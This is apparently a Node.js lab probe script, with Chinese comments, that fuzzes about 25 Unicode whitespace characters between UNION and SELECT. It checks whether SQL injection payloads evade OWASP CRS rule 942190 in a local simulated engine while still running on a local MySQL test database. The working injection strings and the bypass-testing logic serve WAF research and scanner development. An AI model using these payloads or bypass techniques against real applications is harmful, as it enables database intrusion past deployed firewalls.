// ============================================================================
// e2e/waf-real/probe-union-ws.mjs —— §I 第 1 条探针（第三版）：空白字符集差异
//
// 前两版结论：
//   1. 拦我们的不是 942361（起始形状），是 **942190**（PL1，含 `union\s*select`）；
//   2. 942190 的两支都允许「空白 + select」，30 种常规填充全被拦。
//
// 本版换真正有希望的一轴：**MySQL 认作空白、但 CRS 正则的 [\s\x0b] 不覆盖**的字符。
// PCRE 里 \s 默认等价于 [\t\n\f\r ]（**不含** \v），但 CRS 规则显式写成 [\s\x0b] 补了 \v；
// JS 的 \s 更宽（含 \v、\u00a0、\ufeff、各类 unicode 空格）。
// 所以：
//   · 若某字符 MySQL 当空白、CRS 的 [\s\x0b] 不当 → 可能绕过 942190 —— 但要注意
//     我们是用 JS 正则模拟的，JS 的 \s 更宽，这里模拟会**偏严**（倾向误拦），
//     因此「JS 侧放行」是强证据，「JS 侧拦」不能直接判死。
//   · 942190 第二支 `[\s\x0b\(0-9A-Z_a-z]*?select` 允许字母数字，\u00a0 若落进
//     JS 的 \s 就会被吃 —— 需实测。
// ============================================================================
import { createRequire } from 'node:module';
const require = createRequire(new URL('../../server/package.json', import.meta.url));
const mysql = require('mysql2/promise');
const { evaluate } = await import(new URL('./crs-engine.js', import.meta.url).href);

const DB = process.env.MYSQL_DATABASE || 'sqli_lab';
const POOL = mysql.createPool({
  host: process.env.MYSQL_HOST ?? '127.0.0.1',
  port: Number(process.env.MYSQL_PORT) || 3306,
  user: process.env.MYSQL_USER ?? 'root',
  password: process.env.MYSQL_PASSWORD ?? 'root',
  database: DB,
  multipleStatements: true,
});

const MARKER = 'SQLISCANNEROK';

// 候选：MySQL 词法里被当空白的字符（MySQL 文档：ASCII 空格、\t \n \r \f \v，以及部分 unicode 空白）
const CANDIDATES = [
  { label: 'SP', ch: '\u0020', note: 'ASCII 空格（对照）' },
  { label: 'TAB', ch: '\u0009', note: '\\t' },
  { label: 'LF', ch: '\u000a', note: '\\n' },
  { label: 'VT', ch: '\u000b', note: '\\v（CRS 显式补了 \\x0b）' },
  { label: 'FF', ch: '\u000c', note: '\\f' },
  { label: 'CR', ch: '\u000d', note: '\\r' },
  { label: 'NEL', ch: '\u0085', note: 'Next Line' },
  { label: 'NBSP', ch: '\u00a0', note: '不换行空格' },
  { label: 'OGHAM', ch: '\u1680', note: 'OGHAM SPACE MARK' },
  { label: 'EN_QUAD', ch: '\u2000', note: 'EN QUAD' },
  { label: 'EM_QUAD', ch: '\u2001', note: 'EM QUAD' },
  { label: 'EN_SP', ch: '\u2002', note: 'EN SPACE' },
  { label: 'EM_SP', ch: '\u2003', note: 'EM SPACE' },
  { label: '3-PER-EM', ch: '\u2004', note: 'THREE-PER-EM' },
  { label: '4-PER-EM', ch: '\u2005', note: 'FOUR-PER-EM' },
  { label: '6-PER-EM', ch: '\u2006', note: 'SIX-PER-EM' },
  { label: 'FIGURE', ch: '\u2007', note: 'FIGURE SPACE' },
  { label: 'PUNCT', ch: '\u2008', note: 'PUNCTUATION SPACE' },
  { label: 'THIN', ch: '\u2009', note: 'THIN SPACE' },
  { label: 'HAIR', ch: '\u200a', note: 'HAIR SPACE' },
  { label: 'NNBSP', ch: '\u202f', note: 'NARROW NO-BREAK' },
  { label: 'MMSP', ch: '\u205f', note: 'MEDIUM MATH SPACE' },
  { label: 'IDEO', ch: '\u3000', note: 'IDEOGRAPHIC SPACE' },
  { label: 'BOM', ch: '\ufeff', note: 'ZERO WIDTH NO-BREAK' },
  { label: 'ZWSP', ch: '\u200b', note: 'ZERO WIDTH SPACE' },
];

// JS 的 \s 判定（等价于 CRS 模拟执行器的字符类行为）
const JS_WS = /^\s$/;

async function tryExec(sql) {
  try {
    const [rows] = await POOL.query(sql);
    return { ok: true, gotMarker: JSON.stringify(rows).includes(MARKER), rows };
  } catch (e) {
    return { ok: false, err: e.message.slice(0, 55) };
  }
}

console.log('='.repeat(92));
console.log('§I 第三版：MySQL 认作空白 vs CRS [\\s\\x0b] 覆盖的差异矩阵');
console.log('='.repeat(92));
console.log('');
console.log(`${'字符'.padEnd(10)} ${'JS\\s?'.padEnd(7)} ${'在[\\s\\x0b]?'.padEnd(12)} ${'CRS'.padEnd(12)} ${'MySQL'.padEnd(12)} 说明`);
console.log('-'.repeat(92));

const wins = [];
const mssqlOkNotCrs = [];
for (const c of CANDIDATES) {
  const inject = `1 UNION${c.ch}SELECT 999,'${MARKER}'-- -`;
  const v = evaluate({
    uri: '/num',
    queryString: `id=${encodeURIComponent(inject)}`,
    args: { id: inject },
    cookies: {},
    headers: {},
  });
  const r = await tryExec(`SELECT id,username FROM users WHERE id=${inject}`);

  // CRS 的 [\s\x0b] 在 PCRE 里是 [\t\n\f\r \x0b]；JS 里 \s 更宽
  const inCrsClass = /[\t\n\f\r \u000b]/.test(c.ch);
  const jsWs = JS_WS.test(c.ch);

  const crsTxt = v.blocked ? `拦${v.ruleId}` : '放';
  const myTxt = !r.ok ? '语法错' : r.gotMarker ? '取回标记' : '跑了无标记';
  const win = !v.blocked && r.gotMarker;
  if (win) wins.push({ ...c, inject, verdict: v });
  // 记下「MySQL 当空白、CRS 字符类不含」的候选
  if (r.gotMarker && !inCrsClass) mssqlOkNotCrs.push({ ...c, crsTxt, myTxt });

  console.log(
    `${(win ? '★ ' : '  ') + c.label.padEnd(8)} ${(jsWs ? '是' : '否').padEnd(9)} ${(inCrsClass ? '是' : '否').padEnd(14)} ${crsTxt.padEnd(12)} ${myTxt.padEnd(12)} ${c.note}`
  );
}

console.log('');
console.log('='.repeat(92));
console.log(`同时满足「CRS 放行 + MySQL 取回标记」：${wins.length}`);
for (const w of wins) {
  console.log(`  ★ ${w.label} (U+${w.ch.codePointAt(0).toString(16).toUpperCase().padStart(4, '0')}) → ${JSON.stringify(w.inject)}`);
}
console.log('');
console.log(`「MySQL 当空白执行成功、且不在 CRS [\\s\\x0b] 类里」的候选：${mssqlOkNotCrs.length}`);
for (const m of mssqlOkNotCrs) {
  console.log(`  · ${m.label} (U+${m.ch.codePointAt(0).toString(16).toUpperCase().padStart(4, '0')})：CRS=${m.crsTxt} MySQL=${m.myTxt}`);
}
if (mssqlOkNotCrs.length && !wins.length) {
  console.log('  → 说明这些字符虽不在 CRS 显式字符类里，但被 JS 侧更宽的 \\s 吃掉了；');
  console.log('    真实 ModSecurity(PCRE) 下 \\s 不含 \\v/NBSP 等，**需真引擎复测**才能定论。');
}
console.log('='.repeat(92));

await POOL.end();
